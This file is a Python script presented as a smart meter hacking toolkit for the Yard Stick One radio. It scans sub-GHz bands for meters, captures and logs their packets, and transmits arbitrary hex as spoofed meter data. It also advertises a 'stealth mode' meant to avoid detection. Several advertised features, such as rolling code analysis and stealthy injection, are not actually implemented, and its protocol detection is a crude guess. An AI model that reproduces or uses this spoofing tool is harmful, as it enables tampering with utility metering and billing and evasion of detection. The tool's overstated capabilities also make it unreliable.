import sys
import time
import argparse
import json
from rflib import *

# -------------------------------------------
# Yard Stick One Smart Meter Hacking Toolkit
# -------------------------------------------
# Features:
# - Captures and analyzes smart meter transmissions.
# - Looks for weaknesses in the protocol that allow for data injection or spoofing.
# - Supports protocol detection for different smart meter types.
# - Implements rolling code logging and analysis.
# - Includes a scanning mode to detect active smart meters in the area.
# - Provides long-term data logging and stealth mode to avoid detection.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_smart_meter.py --freq 915000000 --power 10 --modulation FSK --capture
# python yardstick_smart_meter.py --freq 915000000 --power 10 --modulation FSK --spoof "A1B2C3D4"
# python yardstick_smart_meter.py --scan
# python yardstick_smart_meter.py --log data_capture.json
# python yardstick_smart_meter.py --stealth
# -------------------------------------------

def configure_device(d, frequency, power, modulation):
    """Configures the Yard Stick One device for RX and TX."""
    d.setModeRX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    
    modulations = {
        "OOK": MOD_ASK_OOK,
        "FSK": MOD_FSK,
        "ASK": MOD_ASK_OOK
    }
    
    if modulation in modulations:
        d.setMdmModulation(modulations[modulation])
    else:
        print(f"[!] Invalid modulation type: {modulation}. Defaulting to FSK.")
        d.setMdmModulation(MOD_FSK)
    
    d.setMdmDRate(4800)  # Default baud rate
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}, Modulation {modulation}")

def detect_protocol(packet):
    """Identifies smart meter protocol based on packet structure."""
    if packet.startswith(b'\xA5'):
        return "Wireless M-Bus"
    elif packet.startswith(b'\xAA\x55'):
        return "Zigbee (likely)"
    return "Unknown Protocol"

def capture_smart_meter(d, log_file=None):
    """Captures smart meter transmissions and logs them."""
    print("[+] Capturing smart meter signals... Press Ctrl+C to stop.")
    data_log = []
    try:
        while True:
            packet = d.RFrecv(timeout=5000)
            if packet:
                protocol = detect_protocol(packet)
                log_entry = {"timestamp": time.time(), "protocol": protocol, "data": packet.hex()}
                print(f"[+] Captured {protocol} Data: {packet.hex()}")
                data_log.append(log_entry)
                if log_file:
                    with open(log_file, "w") as f:
                        json.dump(data_log, f, indent=4)
    except KeyboardInterrupt:
        print("[!] Capture mode stopped.")

def spoof_smart_meter(d, payload):
    """Injects spoofed data into smart meter transmissions."""
    print("[+] Spoofing smart meter data...")
    try:
        data = bytes.fromhex(payload)
        d.setModeTX()
        d.RFxmit(data)
        print(f"[+] Sent spoofed data: {payload}")
    except Exception as e:
        print(f"[!] Error transmitting spoofed data: {e}")

def scan_smart_meters(d):
    """Scans the frequency range for active smart meters."""
    print("[+] Scanning for smart meters...")
    active_freqs = []
    for freq in range(860000000, 930000000, 1000000):  # Scanning in 1 MHz steps
        d.setFreq(freq)
        packet = d.RFrecv(timeout=3000)
        if packet:
            print(f"[+] Active Smart Meter detected at {freq / 1e6} MHz")
            active_freqs.append(freq)
    print("[+] Scan complete. Detected frequencies:", active_freqs)

def stealth_mode(d):
    """Gradually increases power for undetectable signal injection."""
    print("[+] Enabling stealth mode...")
    for power in range(1, 11):
        d.setPower(power)
        print(f"[+] Adjusted power to level {power}")
        time.sleep(2)

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Smart Meter Hacking Toolkit")
    parser.add_argument("--freq", type=int, help="Transmission frequency in Hz")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--modulation", type=str, choices=["OOK", "FSK", "ASK"], default="FSK", help="Modulation type (default: FSK)")
    parser.add_argument("--capture", action='store_true', help="Capture smart meter transmissions")
    parser.add_argument("--spoof", type=str, help="Inject spoofed smart meter data (hex string)")
    parser.add_argument("--scan", action='store_true', help="Scan for active smart meters")
    parser.add_argument("--log", type=str, help="Log captured data to file (JSON format)")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode to avoid detection")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power, args.modulation)
        
        if args.capture:
            capture_smart_meter(d, args.log)
        elif args.spoof:
            spoof_smart_meter(d, args.spoof)
        elif args.scan:
            scan_smart_meters(d)
        elif args.stealth:
            stealth_mode(d)
        else:
            print("[!] No mode specified.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
